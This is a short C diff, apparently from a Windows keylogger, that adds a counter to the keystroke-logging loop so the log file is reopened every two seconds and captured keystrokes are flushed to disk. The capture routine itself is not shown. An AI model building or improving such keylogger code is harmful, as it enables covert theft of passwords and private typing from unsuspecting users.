@@ -70,10 +70,19 @@ int main( int argc, char *argv[ ] )
 
 	// Log the keystrokes
 	log_infos( log_file, "# Keystrokes :\n" );
+	int i = 0;
 	for( ; ; )
 	{
 		Sleep( TIME_TO_SLEEP );
 		log_keystrokes( log_file );
+		
+		if( ++i >= 2000/TIME_TO_SLEEP )
+		// If the elapsed time is greater than 2 seconds
+		{
+			i = 0;
+			// Reopen the file in order to force synchronization
+			log_file = freopen( log_file_name, "a", log_file );
+		}
 	}
 
 }
